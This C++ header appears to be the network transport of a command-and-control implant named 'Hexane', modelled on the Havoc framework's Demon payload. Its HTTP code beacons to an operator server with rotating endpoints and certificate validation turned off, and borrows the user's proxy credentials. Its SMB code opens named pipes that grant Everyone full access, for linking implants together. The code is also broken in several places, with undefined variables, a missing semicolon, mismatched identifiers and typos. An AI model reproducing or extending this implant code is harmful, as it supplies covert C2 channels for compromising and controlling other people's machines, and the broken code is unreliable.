#ifndef HEXANE_NETWORK_HPP
#define HEXANE_NETWORK_HPP

namespace Network {
    namespace Http {
        BOOL HttpSendRequest(HINTERNET hInternet, PACKET** packet) {
            DWORD read     = 0;
            DWORD inLength = 0;

            UINT32 total		= 0;
            UINT32 lastRead   	= 0;
            UINT32 defLength  	= 8192;

            BOOL success  	= false;
            LPVOID response = Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, defLength);
            LPVOID buffer   = Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, defLength);

            do {
                if (!Ctx->Win32.WinHttpQueryDataAvailable(hInternet, &inLength)) {
					goto defer;
                }

                lastRead = inLength;

                if (inLength > defLength) {
                    void *rBuffer  = Ctx->Win32.RtlReAllocateHeap(Ctx->Heap, 0, buffer, inLength);
                    if (!rBuffer) {
                        goto defer;
                    }

                    buffer = rBuffer;
                }
                MemSet(buffer, 0, inLength);

                if (!Ctx->Win32.WinHttpReadData(request, buffer, inLength, &read)) {
                    goto defer;
                }
                if (total + read > defLength) {
                    void *rResponse = Ctx->Win32.RtlReAllocateHeap(Ctx->Heap, 0, response, (total + read) * 2);
                    if (!rResponse) {
                        goto defer;
                    }

                    response = rResponse;
                }

                MemCopy((PBYTE) response + total, buffer, read);
                total += read;
            } 
			while (inLength > 0);

            *packet = (PACKET*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(PACKET));
            (*packet)->Buffer = (PBYTE)response;
            (*packet)->Length = total;

			success = true;
defer:
            if (!success) {
                MemSet(response, 0, total);
                Free(response);
            }

            MemSet(buffer, 0, lastRead);
            Ctx->Win32.RtlFreeHeap(Ctx->Heap, 0, buffer);

            return success;
        }

        VOID DestroyRequestContext(REQUEST* request) {
            if (request) {
                if (request->ReqHandle)    { Ctx->Win32.WinHttpCloseHandle(request->ReqHandle); }
                if (request->ConnHandle)   { Ctx->Win32.WinHttpCloseHandle(request->ConnHandle); }

                if (request->Endpoint) {
                    MemSet(request->Endpoint, 0, WcsLength(request->Endpoint) * sizeof(WCHAR));
                    Ctx->Win32.RtlFreeHeap(Ctx->Heap, 0, request->Endpoint);
                }
            }
        }

        VOID DestroyProxyContext(PROXY* proxy) {
            if (proxy) {
                if (proxy->Config.lpszProxy)          	{ Ctx->Win32.RtlFreeHeap(Ctx->Heap, 0, proxy->Config.lpszProxy); }
                if (proxy->Config.lpszProxyBypass)    	{ Ctx->Win32.RtlFreeHeap(Ctx->Heap, 0, proxy->Config.lpszProxyBypass); }
                if (proxy->Config.lpszAutoConfigUrl)  	{ Ctx->Win32.RtlFreeHeap(Ctx->Heap, 0, proxy->Config.lpszAutoConfigUrl); }
            }
        }

        BOOL CreateRequestContext(REQUEST* request) {
            const auto address  = Ctx->Transport.Http->Address;
            const auto port     = Ctx->Transport.Http->Port;

            if (!Ctx->Transport.Http->hInternet) {
				Ctx->Transport.Http->hInternet = Ctx->win32.WinHttpOpen(
						ctx->transport.http->useragent, 
						WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

				if (!Ctx->Transport.Http->hInternet) {
                    return false;
                }
            }

            request->ConnHandle = ctx->win32.WinHttpConnect(internet, address, port, 0);
			if (!request->ConnHandle) {
                Ctx->Win32.NtClose(internet);
                return false;
            }

			auto idx = Utils::Random::RandomNumber32() % (Ctx->Transport.Http->nEndpoints);
            request->Endpoint = Ctx->Transport.Http->Endpoints[idx];

            auto endpoint   = request->Endpoint;
            auto flags      = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

            if (Ctx->Transport.bSSL) {
                flags |= WINHTTP_FLAG_SECURE;
            }

            request->ReqHandle = Ctx->Win32.WinHttpOpenRequest(request->ConnHandle, L"GET", endpoint, nullptr, nullptr, nullptr, flags);
			if (!request->ReqHandle) {
                return false;
            }

            return true;
        }

        BOOL CreateProxyContext(PROXY* proxy, REQUEST* request) {
            auto proxyInfo     = proxy->proxyInfo;
            const auto username = Ctx->Transport.Http->Proxy->Username;
            const auto password = Ctx->Transport.Http->Proxy->Password;

            if (Ctx->Transport.bProxy) {
                proxyInfo.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                proxyInfo.lpszProxy     = Ctx->Transport.Http->Proxy->Address;

                if (!Ctx->Win32.WinHttpSetOption(request->ReqHandle, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(WINHTTP_proxyInfo))) {
                    return false;
                }

                if (username && password) {
                    if (!ctx->win32.WinHttpSetOption(request->ReqHandle, WINHTTP_OPTION_PROXY_USERNAME, username, WcsLength(username)) ||
                        !ctx->win32.WinHttpSetOption(request->ReqHandle, WINHTTP_OPTION_PROXY_PASSWORD, password, WcsLength(password))) {
                        return false;
                    }
                }
            }
            else if (!Ctx->Transport.bCheckProxy) {
                auto autoproxy = proxy->Autoproxy;

                autoproxy.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
                autoproxy.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
                autoproxy.lpszAutoConfigUrl      = nullptr;
                autoproxy.lpvReserved            = nullptr;
                autoproxy.dwReserved             = 0;
                autoproxy.fAutoLogonIfChallenged = true;

                if (Ctx->Win32.WinHttpGetProxyForUrl(Ctx->Transport.Http->Handle, request->Endpoint, &autoproxy, &proxyInfo)) {
                    Ctx->Transport.nEnvProxy  	= sizeof(WINHTTP_PROXY_INFO);
                    Ctx->Transport.EnvProxy		= (WINHTTP_PROXY_INFO) Ctx->Win32.RtlAllocateHeap(Ctx->Transport.nEnvProxy);

                    MemCopy(Ctx->Transport.EnvProxy, &proxyInfo, Ctx->Transport.nEnvProxy);
                }
                else {
                    auto proxyConfig = proxy->ProxyConfig;
                    if (Ctx->Win32.WinHttpGetIEProxyConfigForCurrentUser(&proxyConfig)) {

                        if (proxyConfig.lpszProxy != nullptr && WcsLength(proxyConfig.lpszProxy) != 0) {
                            proxyInfo.dwAccessType      = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                            proxyInfo.lpszProxy         = proxyConfig.lpszProxy;
                            proxyInfo.lpszProxyBypass   = proxyConfig.lpszProxyBypass;

                            Ctx->Transport.nEnvProxy    = sizeof(WINHTTP_PROXY_INFO);
                            Ctx->Transport.EnvProxy    	= Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, Ctx->Transport.nEnvProxy);

                            MemCopy(Ctx->Transport.EnvProxy, &proxyInfo, Ctx->Transport.nEnvProxy);

                            proxyConfig.lpszProxy       = nullptr;
                            proxyConfig.lpszProxyBypass = nullptr;
                        }
                        else if (proxyConfig.lpszAutoConfigUrl != nullptr && WcsLength(proxyConfig.lpszAutoConfigUrl) != 0) {
                            autoproxy.dwFlags            = WINHTTP_AUTOPROXY_CONFIG_URL;
                            autoproxy.lpszAutoConfigUrl  = proxyConfig.lpszAutoConfigUrl;
                            autoproxy.dwAutoDetectFlags  = 0;

                            Ctx->Win32.WinHttpGetProxyForUrl(Ctx->Transport.Http->hInternet, request->Endpoint, &autoproxy, &proxyInfo);
                            Ctx->Transport.nEnvProxy     = sizeof(WINHTTP_PROXY_INFO);
                            Ctx->Transport.EnvProxy      = Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, Ctx->Transport.nEnvProxy);

                            MemCopy(Ctx->Transport.EnvProxy, &proxyInfo, Ctx->Transport.nEnvProxy);
                        }
                    }
                }
                Ctx->Transport.bCheckPoxy = true;
            }

            if (Ctx->Transport.EnvProxy) {
                if (!Ctx->Win32.WinHttpSetOption(request->ReqHandle, WINHTTP_OPTION_PROXY, Ctx->Transport.EnvProxy, Ctx->Transport.nEnvProxy)) {
                    return false;
                }
            }

            return true;
        }

        BOOL HttpCallback(PACKET **inPack, PACKET *outPack) {
            // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
            // TODO: reverting tokens during http operations

            PROXY proxy = { };
            REQUEST request = { };

            UINT32 status 	= 0;
            DWORD nStatus 	= sizeof(UINT32);
            BOOL success 	= false;

            const auto handle   = request.ReqHandle;
            const auto query    = WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER;
            auto secFlags 		= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

            if (!CreateRequestContext(&request) || !CreateProxyContext(&proxy, &request)) {
                goto defer;
            }
            if (Ctx->Transport.bSSL) {
                if (!Ctx->Win32.WinHttpSetOption(handle, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(ULONG))) {
					goto defer;
				}
            }

            if (Ctx->Transport.Http->Headers) {
                WCHAR *header	= nullptr;
                UINT32 nHeaders = 0;

                while (true) {
                    header = Ctx->Transport.Http->Headers[nHeaders];
					if (!header) {
                        break;
                    }
                    if (!Ctx->Win32.WinHttpAddRequestHeaders(handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
						goto defer;
					}
                    nHeaders++;
                }
            }

            if (!Ctx->Win32.WinHttpSendRequest(handle, nullptr, 0, outPack->MsgData, outPack->MsgLength, outPack->MsgLength, 0)) { 
				goto defer;
			}
            if (!Ctx->Win32.WinHttpReceiveResponse(handle, nullptr)) {
				goto defer;
			}
            if (!Ctx->Win32.WinHttpQueryHeaders(handle, query, nullptr, &status, &nStatus, nullptr)) {
				goto defer;
			}
            if (status != HTTP_STATUS_OK) {
                goto defer;
            }
            if (!HttpSendRequest(request.ReqHandle, inPack)) {
				goto defer;
			}

			success = true
defer:
            DestroyRequestContext(&request);
            DestroyProxyContext(&proxy);

            return success;
        }
    }

    namespace Smb {
		typedef struct _SMB_PIPE_SEC_ATTR {
			PSID	Sid;
			PSID	SidLow;
			PACL	pAcl;
			PSECURITY_DESCRIPTOR SecDesc;
		} SMB_PIPE_SEC_ATTR, *PSMB_PIPE_SEC_ATTR;

        VOID SmbContextDestroy(PSMB_PIPE_SEC_ATTR SmbSecAttr) {
            if (SmbSecAttr->sid)        { ctx->win32.FreeSid(SmbSecAttr->sid); 		SmbSecAttr->sid = nullptr; }
            if (SmbSecAttr->sid_low)    { ctx->win32.FreeSid(SmbSecAttr->sid_low); 	SmbSecAttr->sid_low = nullptr; }
            if (SmbSecAttr->p_acl)      { Free(SmbSecAttr->p_acl); }
            if (SmbSecAttr->sec_desc)   { Free(SmbSecAttr->sec_desc); }
        }

		VOID SmbInitContext(SMB_PIPE_SEC_ATTR *smbSecAttr, PSECURITY_ATTRIBUTES secAttr) {
			SID_IDENTIFIER_AUTHORITY world 	= SECURITY_WORLD_SID_AUTHORITY;
			SID_IDENTIFIER_AUTHORITY label 	= SECURITY_MANDATORY_LABEL_AUTHORITY;
			EXPLICIT_ACCESSA access 		= { };
			DWORD status					= 0;
			PACL dacl 						= nullptr;

			x_memset(smbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
			x_memset(secAttr, 0, sizeof(PSECURITY_ATTRIBUTES));

			if (!AllocateAndInitializeSid(&world, 1, SECURITY_WORLD_RID, 0,0,0,0,0,0,0, &smbSecAttr->Sid)) {
				return false;
			}

			access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
			access.grfInheritance       = NO_INHERITANCE;
			access.grfAccessMode        = SET_ACCESS;
			access.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
			access.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
			access.Trustee.ptstrName    = (LPSTR) smbSecAttr->Sid;

			status = SetEntriesInAclA(1, &access, nullptr, &dacl);
			if (status != 0) {
				// soft error
			} 
			if (!AllocateAndInitializeSid(&label, 1, SECURITY_MANDATORY_LOW_RID, 0,0,0,0,0,0,0, &smbSecAttr->SidLow)) {
				// soft error
			}

			smbSecAttr->pAcl = (PACL) HeapAlloc(GetProcessHeap(), 0, MAX_PATH);
			if (!InitializeAcl(smbSecAttr->pAcl, MAX_PATH, ACL_DEVISION_DS)) {
				// soft error
			}
			if (!AddMandatoryAce(smbSecAttr->pAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, smbSecAttr->SidLow)) {
				// soft error
			}

			smbSecattr->SecDec = (PSECURITY_DESCRIPTOR) HeapAlloc(GetProcessHeap(), 0, SECURITY_DESCRIPTOR_MIN_LENGTH);
			if (!InitializeSecurityDescriptor(smbSecAttr->SecDec, SECURITY_DESCRIPTOR_REVISION)) {
				// soft error
			} 
			if (!SetSecurityDescriptorDacl(smbSecAttr->SecDec, true, dacl, false)) {
				// soft error
			}
			if (!SetSecurityDescriptorSacl(smbSecAttr->SecDec, true, smbSecAttr->pAcl, false)) {
				// soft error
			}

			secAttr->lpSecurityDescriptor = smbSecAttr->SecDec;
			secAttr->bInheritHandle = false;
			secAttr->nLength = sizeof(SECURITY_ATTRIBUTES);

			return true;
		}

        BOOL PipeRead(void *handle, PACKET *in) {
            uint32_t read   = 0;
            uint32_t total  = 0;

            do {
                const auto length = __min((in->length - total), PIPE_BUFFER_MAX);

                if (!ctx->win32.ReadFile(handle, B_PTR(in->buffer) + total, length, (DWORD*) &read, nullptr)) {
                    if (ntstatus == ERROR_NO_DATA) {
                        return false;
                    }
                }

                total += read;
            }
            while (total < in->length);
            return true;
        }

        BOOL PipeWrite(void *handle, PACKET *out) {
            uint32_t total = 0;
            uint32_t write = 0;

            do {
                const auto length = __min((out->length - total), PIPE_BUFFER_MAX);

                if (!ctx->win32.WriteFile(handle, B_PTR(out->buffer) + total, length, (DWORD*) &write, nullptr)) {
                    return false;
                }

                total += write;
            }
            while (total < out->length);
            return true;
        }

        BOOL PipeSend (PACKET *out) {
            SMB_PIPE_SEC_ATTR smb_sec_attr  = { };
            SECURITY_ATTRIBUTES sec_attr    = { };

			if (!ctx->transport.egress_handle) {
				SmbInitContext(&smb_sec_attr, &sec_attr);

				ctx->transport.egress_handle = ctx->win32.CreateNamedPipeW(
						ctx->transport.egress_name, 
						PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 
						PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr);

				if (!ctx->transport.egress_handle || ctx->transport.egress_handle == INVALID_HANDLE_VALUE) {
					return false;
				}

				SmbDestroyContext(&smb_sec_attr);

				if (!ctx->win32.ConnectNamedPipe(ctx->transport.egress_handle, nullptr)) {
					ctx->win32.NtClose(ctx->transport.egress_handle);
					return false;
				}
			}

            if (!PipeWrite(ctx->transport.egress_handle, out)) {
                if (ntstatus == ERROR_NO_DATA) {

                    if (ctx->transport.egress_handle) {
                        ctx->win32.NtClose(ctx->transport.egress_handle);
                    }
                    return false;
                }
            }
            return true;
        }

        BOOL PipeReceive(PACKET** in) {
            uint32_t peer_id    = 0;
            uint32_t msg_size   = 0;

            DWORD total = 0;
            *in = CreatePacket();

            if (ctx->win32.PeekNamedPipe(ctx->transport.egress_handle, nullptr, 0, nullptr, &total, nullptr)) {
                if (total > sizeof(uint32_t) * 2) {

                    if (!ctx->win32.ReadFile(ctx->transport.egress_handle, &peer_id, sizeof(uint32_t), &total, nullptr)) {
                        return false;
                    }
                    if (ctx->session.peer_id != peer_id) {
                        return false;
                    }
                    if (!ctx->win32.ReadFile(ctx->transport.egress_handle, &msg_size, sizeof(uint32_t), &total, nullptr)) {
                        if (ntstatus != ERROR_MORE_DATA) {
                            return false;
                        }
                    }

                    if (!PipeRead(ctx->transport.egress_handle, *in)) {
                        if (*in) {
                            DestroyPacket(*in);
                        }
                        return false;
                    }
                }
            }

            return true;
        }
    }
}
#define HEXANE_NETWORK_HPP
